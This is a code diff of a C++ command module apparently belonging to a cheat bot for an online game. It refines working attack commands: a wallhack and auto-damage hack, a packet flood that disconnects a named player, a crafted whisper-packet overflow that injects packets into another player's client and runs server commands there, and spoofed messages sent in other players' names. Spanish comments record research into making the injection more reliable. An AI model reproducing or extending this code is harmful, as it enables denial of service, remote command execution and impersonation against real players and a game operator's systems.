@@ -11,17 +11,20 @@
 using namespace std;
 
 const map<string, string> Command::help_msgs = {
-	{"send", "Send the packet built with the hexbuf. Syntax: send hexbuf"},
-	{"move", "Move to coords (x, y). Syntax: move type x y"},
-	{"attack", "Attack current target. Syntax: attack"},
-	{"autodmg", "Enable or disable the autodmg hack, which attracts and attacks every close enemy. Syntax: autodmg 0/1"},
-	{"msg", "Send a message. Syntax: msg type message"},
-	{"wallhack", "Enable or disable the wallhack. Syntax: wallhack 0/1"},
-	{"dc", "Start trying to disconnect the player. It sends by default 20 dc packets. Syntax: dc player [packets]"},
-	{"dc_stop", "Stop trying to disconnect the player. Syntax: dc_stop"},
+	{"send",      "Send the packet built with the hexbuf. Syntax: send hexbuf"},
+	{"move",      "Move to coords (x, y). Syntax: move type x y"},
+	{"attack",    "Attack current target. Syntax: attack"},
+	{"autodmg",   "Enable or disable the autodmg hack, which attracts and attacks every close enemy. Syntax: autodmg 0/1"},
+	{"msg",       "Send a chat message. Syntax: msg type message"},
+	{"wallhack",  "Enable or disable the wallhack. Syntax: wallhack 0/1"},
+	{"dc",        "Start trying to disconnect the player. It sends by default 20 dc packets. Uses packet injection. Syntax: dc player [packets]"},
+	{"dc_stop",   "Stop trying to disconnect the player. Syntax: dc_stop"},
 	{"hack_life", "Executes a server command in another player's client. Uses packet injection. Syntax: hack_life player cmd"},
-	{"inj", "Perform remote packet injection on player. Works bad. Syntax: inj player hexbuf"},
-	{"whisp", "Send a message to a player as if it had been sent by another player. Uses packet injection. Syntax: whisp type to_player from_player msg"}
+	{"whisp",     "Send a message to a player as if it had been sent by another player. Uses packet injection. Syntax: whisp type to_player from_player msg"},
+	{"inj",       "Perform remote packet injection on player. Syntax: inj player hexbuf"},
+	{"run",       "Run a server command. Syntax: run cmd"},
+	{"porculing", "Attempt of knockback hack. Still being tested. Syntax: porculing"},
+	{"ghostmode", "Attempt of ghostmode hack. Still being tested. Syntax: ghostmode"}
 };
 Command* const Command::instance = new Command();
 
@@ -42,12 +45,6 @@ void Command::update_enemy(uint id, int x, int y){
 		Enemy en = {x, y};
 		instance->enemies[id] = en;
 	}
-
-	/*cout << endl << "{";
-	for (auto it : instance->enemies){
-		cout << it.first << ": (" << it.second.x << ", " << it.second.y << "), ";
-	}
-	cout << "}" << endl << endl;*/
 }
 
 void Command::delete_enemy(uint id){
@@ -57,7 +54,6 @@ void Command::delete_enemy(uint id){
 	else
 		cout << "[ERROR] Attempted to delete not existing enemy: " << id << endl;
 }
-
 
 bool Command::check_n_args(uint n, const vector<string>& cmd){
 	return cmd.size() >= n+1;
@@ -114,10 +110,11 @@ void Command::autodmg(bool enabled){
 		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_autodmg, 0, 0, 0);
 }
 
+// Processes a message in order to insert colors easily.
+// Example: [FF0000]red[] normal [00FF00]green[]
 string Command::process_msg(string msg){
 	msg = replace_all(msg, "||", "|");
 	size_t i1 = msg.find("["), i2, len;
-	//string replace = "";
 	while (i1 != msg.npos){
 		i2 = msg.find("]");
 		if (i2 == msg.npos)
@@ -129,7 +126,6 @@ string Command::process_msg(string msg){
 			msg.replace(i1, len + 2, color(msg.substr(i1 + 1, len)));
 		else
 			print_err("Error processing color tag in message");
-		//msg.replace(i1, len+2, replace);
 		i1 = msg.find("[", i1+1);
 	}
 	return msg;
@@ -148,18 +144,13 @@ void Command::set_wallhack(bool enabled){
 void Command::_packet_injection(const string& username, Packet* p){
 	/*
 	[INVESTIGACION]
-	Si se pone breakpoint en parse_recv_whisper y se van viendo llegar los paquetes no ocurre el bug.
-	Lo actual funciona, se llama a la función que debe parsear el paquete malicioso, y no peta luego
-	porque el paquete siguiente es válido.
-	Si se quita el paquete siguiente no ocurre el bug.
 
 	PROBLEMA: no puedo meter nullbytes.
 
 	Probar a meter nullbytes con otros paquetes. Aunque parece demasiado locura.
 
-	La inyección me ha funcionado +20 veces seguidas, aunque es raro. Pero probablemente pueda
-	inyectar varios paquetes. Incluso probablemente pueda inyectarlos seguidos en vez de en diferentes
-	ejecuciones, poniendo otro paquete malicioso en vez del paquete final.
+	Probablemente pueda inyectar varios paquetes. Incluso probablemente pueda inyectarlos 
+	seguidos en vez de en diferentes ejecuciones, poniendo otro paquete malicioso después.
 
 	Paquetes sin nullbytes:
 		whisper: enviar mensaje, posiblemente como gm
@@ -216,7 +207,7 @@ void Command::_packet_injection(const string& username, Packet* p){
 	for (int i = 0; i < INJ_PACKET_COUNT; i++)
 		buf += CG_Whisper(username, string(INJ_PACKET_LEN, INJ_PADDING_BYTE)).get_buf();
 
-	// packet
+	// more padding + injected packet
 	buf += CG_Whisper(username, string(INJ_LAST_PACKET_PAD, INJ_PADDING_BYTE) + p_buf).get_buf();
 
 	// Valid packet after malicious packet. Seems like it is not necessary anymore.
@@ -227,21 +218,21 @@ void Command::_packet_injection(const string& username, Packet* p){
 }
 
 void Command::_disconnect() {
-	// Igual se puede hacer gradual comprobando si el pj se ha desconectado o no
+	// Maybe we can do it gradually checking if the character has already been disconnected or not
 	cout << "[BOT] Sending " << instance->disconnect_packets << " packets to disconnect " << instance->username_dc << endl;
 	int i = 0;
 	while (instance->disconnecting && i < instance->disconnect_packets) {
-		//cout << "[BOT] Sending msg " << i << " to " << instance->username_dc << endl;
 		CG_Whisper p(instance->username_dc, to_string(i) + string(DISCONNECT_PACKET_LEN, DISCONNECT_BYTE) + to_string(i));
 		p.send();
-		//Sleep(1);
+		//Sleep(1); // it could be good
 		i++;
 	}
 	instance->disconnecting = false;
 }
+
+// Other option: do it the same as with packet injection, sendingall the packets at a time.
 /*
 void Command::_disconnect() {
-	// Igual se puede hacer gradual comprobando si el pj se ha desconectado o no
 	cout << "[BOT] Sending " << instance->disconnect_packets << " packets to disconnect " << instance->username_dc << endl;
 	string buf;
 	int i = 0;
@@ -254,27 +245,6 @@ void Command::_disconnect() {
 	instance->disconnecting = false;
 }*/
 
-void Command::_test_chat() {
-	// Igual se puede hacer gradual comprobando si el pj se ha desconectado o no
-	cout << "[BOT] Sending " << instance->test_chat_packets << " chat packets" << endl;
-	int i = 0;
-	while (instance->test_chatting && i < instance->test_chat_packets) {
-		//cout << "[BOT] Sending msg " << i << " to " << instance->username_dc << endl;
-		//CG_Chat p(0, to_string(i) + string(TEST_CHAT_PACKET_LEN, 'a') + to_string(i));
-		//CG_ItemUse p(1);
-
-		// 43 00 46DC0200 D7
-		string buf = "\x43";
-		buf += '\x00';
-		buf += string((char*)&instance->target, 4);
-		buf += '\x00';
-		Packet p(buf);
-		p.send();
-		//Sleep(1);
-		i++;
-	}
-	instance->test_chatting = false;
-}
 
 void Command::disconnect(const string& username, int n_packets){
 	instance->username_dc = username;
@@ -282,14 +252,6 @@ void Command::disconnect(const string& username, int n_packets){
 	if (!instance->disconnecting){
 		instance->disconnecting = true;
 		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_disconnect, 0, 0, 0);
-	}
-}
-
-void Command::test_chat(int n_packets) {
-	instance->test_chat_packets = n_packets;
-	if (!instance->test_chatting) {
-		instance->test_chatting = true;
-		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_test_chat, 0, 0, 0);
 	}
 }
 
@@ -320,11 +282,9 @@ void Command::porculing(){
 }
 
 void Command::run_GC_command(const std::string& cmd){
-	// TODO
 	print("Running " + cmd);
-	//packet_struct* new_pkt_struct = new packet_struct(std_pkt_struct);
-	((void (__thiscall*)(packet_struct*, const char*))0x1bd140)(*(packet_struct**)0x0037e438, cmd.c_str());
-	//delete new_pkt_struct;
+	GC_Chat p(5, 0, cmd);
+	p.recv();
 }
 
 void Command::hack_life(const string& username, const string& cmd){
@@ -420,17 +380,6 @@ void Command::run(const string& _cmd){
 		if (check = check_n_args(1, cmd))
 			set_wallhack((bool)stoi(cmd[1]));
 
-	} else if (cmd[0] == "shoot"){
-		// TESTING
-		string buf("\x33");
-		buf += p32(instance->target);
-		buf += string("\x70\xa3\x0e\x00\x71\x81\x02\x00\x00", 9);
-		string buf2("\x36\x00\x00", 3);
-		Packet p1(buf);
-		Packet p2(buf2);
-		p1.send();
-		p2.send();
-
 	} else if (cmd[0] == "dc"){
 		if (check = check_n_args(1, cmd))
 			if (check_n_args(2, cmd))
@@ -441,14 +390,13 @@ void Command::run(const string& _cmd){
 	} else if (cmd[0] == "dc_stop"){
 		instance->disconnecting = false;
 
-	} else if (cmd[0] == "test_chat") {
-		if (check_n_args(1, cmd))
-			test_chat(stoi(cmd[1]));
-		else
-			test_chat();
-
-	} else if (cmd[0] == "test_chat_stop") {
-		instance->test_chatting = false;
+	} else if (cmd[0] == "hack_life"){
+		if (check = check_n_args(2, cmd)) {
+			string msg;
+			for (auto it = cmd.begin() + 2; it != cmd.end(); ++it)
+				msg += *it + " ";
+			hack_life(cmd[1], msg);
+		}
 
 	} else if (cmd[0] == "whisp"){
 		if (check = check_n_args(4, cmd)){
@@ -458,33 +406,28 @@ void Command::run(const string& _cmd){
 			whisper(stoi(cmd[1]), cmd[2], cmd[3], msg);
 		}
 
-	} else if (cmd[0] == "inj") {
+	} else if (cmd[0] == "inj"){
 		if (check = check_n_args(2, cmd))
 			packet_injection(cmd[1], cmd[2]);
 
-	} else if (cmd[0] == "porculing"){
-		porculing();
-
-	} else if (cmd[0] == "run"){
-		if (check = check_n_args(1, cmd)){
+	} else if (cmd[0] == "run") {
+		if (check = check_n_args(1, cmd)) {
 			string msg;
 			for (auto it = cmd.begin() + 1; it != cmd.end(); ++it)
 				msg += *it + " ";
 			run_GC_command(msg);
 		}
-	
-	} else if (cmd[0] == "hack_life"){
-		if (check = check_n_args(2, cmd)){
-			string msg;
-			for (auto it = cmd.begin() + 2; it != cmd.end(); ++it)
-				msg += *it + " ";
-			hack_life(cmd[1], msg);
-		}
+
+	} else if (cmd[0] == "porculing"){
+		porculing();
 
 	} else if (cmd[0] == "ghostmode"){
 		ghostmode();
 
-	} else print_err("Unknown command: " + cmd[0]);
+	} else {
+		print_err("Unknown command: " + cmd[0]);
+		help();
+	}
 
 	if (!check){
 		print_err("Bad arguments!");
